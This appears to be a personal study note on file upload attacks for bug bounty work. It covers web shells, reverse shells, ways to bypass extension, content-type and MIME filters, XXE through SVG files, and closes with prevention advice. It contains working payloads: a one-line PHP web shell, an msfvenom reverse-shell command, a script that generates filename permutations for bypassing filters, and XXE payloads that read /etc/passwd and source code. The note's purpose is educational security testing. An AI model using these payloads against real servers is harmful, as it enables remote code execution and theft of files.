---
{"dg-publish":true,"permalink":"/cybersecurity/bug-bounties/file-upload-attacks/"}
---

# Intro to File Upload Attacks

File uploads allow social media users (etc.) to store their images and files corporate websites but also present a serious potential atack vector.

## Types of File upload Attacks

The most basic vulnerability is when the server allows file upload without any kind of validation filters.

If there is no validation and no protection it's easy toupload a Web Shell Script or a Reverse Shell script.

## Identifying the Web Framework

To upload a malicious script, we must first identify the backend technology running the server.

Often this can be done by looking at the extension on the /index.ext page.

We may need to fuzz it if the index is hidden.  We can use **Burp Intruder** for fuzzing or **Wappalyzer** browser extension.

## Upload Exploitation

### Web Shells

There are multiple webshells provided by [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) and there is also [phpbash](https://github.com/Arrexel/phpbash)

Custom web shell:
```php
<?php system($_REQUEST['cmd']); ?>
```

Web shells can exist for any web framework, the difference is the command.

### Reverse Shell

[Pentestmonkey Reverse PHP Shell](https://github.com/pentestmonkey/php-reverse-shell)

### Generating Custom Reverse Shell Scripts

msfvenom can generate many reverse shell scripts in many languages.

```shell-session
User@Comp $ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```

### Client Side Validation

You can tell the difference between front and back end validation by determining whether the browser refreshes.

If the system just uses client-side validation, the protection can be circumvented using Burpsuite to modify the request.

Also, you can look to remove the validation function from the current copy of the website in your client.  Ctl+Shift+K opens up the inspector.  Then find the function that is doing the validation and try and remove it.

## Blacklist Filters

Commone exploitation extensions may be blacklisted on the back end.

### Blacklisting Extensions

There are to common forms of validating.  Testing against a **blacklist** or testing against a **whitelist.**

When we run up against an extension blacklist (or whitelist) the first step is to fuzz the upload function with a list of potential extensions to see which return errors and which return a different message.

Seclist of common **Web Extesions** is good for this.

Use the Burp Intruder for fuzzing the upload request file extension.

It's important to use the right list for fuzzing.  (i.e., use a php extension list if fuzzing for php vulnerability.)

## Whitelist Filters

A whitelist is allowed file extensions.  A whitelist is generally more secure than a blacklist.

Whitelists and blacklists may be used in tandem.

### Whitelisting extensions.
A typical whitelist file extension test:
```php
1 $fileName = basename($_FILES["uploadFile"]["name"]);
2  
3 if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
4     echo "Only images are allowed";
5     die();
6 }
```
Line 5 has the regex match string.  ^ is the start of the string followed by .*  The . is "any character" and the * is any number of times.  \ is the regex escape character which tells regex it's looking for the actual character followed by the \.  (In this case, a '.'  So it looks for any characters until it finds "." then makes sure that the "." is followed by one of the extensions between the ().

Most importantly, it doesn't then check to see if the string ends.  I think they could do that by tacking the end of string regex ($) at the end.

### Double Extensions

Because of the potential regex error above, Sometimes bypassing the whitelist filter is as simple as using two extensions. e.g, if the website is filtering only images you might do "myshell.jpg.php" as the filename.

### Reverse Double Extensions

Are also possible.  So in the above example: “myshell.php.jpg"

### Character Injection

Some special characters can cause the web server to end the filename and store the truncate the filename (and store it as a file of the first extension's filetype) while still passing the whitelist.

The following are some of the characters we may try injecting:

-   `%20`
-   `%0a`
-   `%00`
-   `%0d0a`
-   `/`
-   `.\`
-   `.`
-   `…`
-   `:`

The following script is an example of code that will permutate names for a target that is allowing image (specifically jpg) uploads.
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

Use ZAP or Burp to Fuzz the server and see if any of the payloads pass the whitelist and blacklist.

If so, you can Fuzz the actual pages to see if you can get remote code execution on the permutation list and see which ones are successful.

## Type Filters

Content filters will test the actual content of uploaded files to ensure it matches the specified type. Usually there is no need to blacklist or whitelist because they only handle one category of files. 

The two common methods for validating file content are Content-Type Header or File Content.

### Content-Type

Example PHP code of how the website checks content-type:
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```
The $type variable is set from the Content-Type header. This is set client-side by the browser, so we can manipulate it and possibly bypass the type filter.  We can start by fuzzing the content-type wordlist through Burp or ZAP.  We can extract image file types from the list like so:
```shell-session
user@computer $ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
user@computer $ cat content-type.txt | grep 'image/' > image-content-types.txt
```

### MIME-type

MIME (Multipurpose Internet Mail Extensions)-type.  The file's content is determined through its general format and bytes structure.  The first few bytes contain the **file signature** or **magic bytes**.

MIME types can be validated by web servers using the mime_content_type() function in PHP.

The GIF file type has a text signature that can be mimicked by "GIF8".  Sometime this is enough to bypass an image filter that uses MIME detection.

File upload vulnerabilities can allow us to introduce a [[Cybersecurity/Bug Bounties/Cross-Site Scripting/Stored (Persistent) XSS\|Stored XSS]] vulnerability.

Another example of XSS attacks is web applications that display an image's metadata after its payload.  We can include an XSS payload in one of the Metadata parameters that accept raw text like the **Comment** or **artist** field.

[[Programming/Scalable Vector Graphcs\|Scalable Vector Graphcs]] images are xml-based and describe 2d vector graphics, which the browser renders into an image.  WE can modify the xml data to include an XSS payload.

### XXE

Similar attacks can be carried to lead to XXE exploitation.  This an SVG image that leaks the content of /etc/passwd.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

XXE can also be used to locate and read source code in php web apps.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

The output from the payload doesn't always show in the image.  Sometimes you need to go into the source code using the inspector and find the element for where the SVG file is supposed to be displayed.  That is where the payload output will be.

## Other Upload Attacks

### Injections in File Name
A common upload attack is to use a malicious string in the uploaded file name.  The string may get executed when the file is moved.

### Upload Directory Disclosure
We can fuzz or do something like an LFI/XXE vulnerability that will allow us to determine where there are uploaded files. 

We might also force upload errors by uploading already existing files or the same file twice to get an error message showing the upload directory.

### Windows Specific Attacks
Usre reserved characters in the filename | < > *  or ?.  Use reserved names like C, com1, LPT1, or NUL

### Advanced File Upload Attacks

Basically, any automatic processing that occurs to an uploaded file may be a potential attack vector.

## Preventing File Upload Vulnerabilities

* Valdiate extensions -- use blacklist and whitelist.  The blacklist checks if the extension exists anywhere in the filename.  The whitelist looks for it at the end of the file.
* Validate content -- needs to be done in conjunction with extension validation.
* Avoid disclosing the uploads directory or providing direct access to the uploaded file.  Downloading files should be done by fetching the file and not providing access tot he directory.  Randomize the names of uploaded files in storage and keep the sanitized names in a database.  Finally keep the uploaded files in a separate server or container.
* Disable specific functions that may be used to eecute system commands through a web app.    PHP disable_functions such as exec, shell_exec, system, passthru.
* Disable showing of any system or server errors to avoid sensitive information disclosure.
* 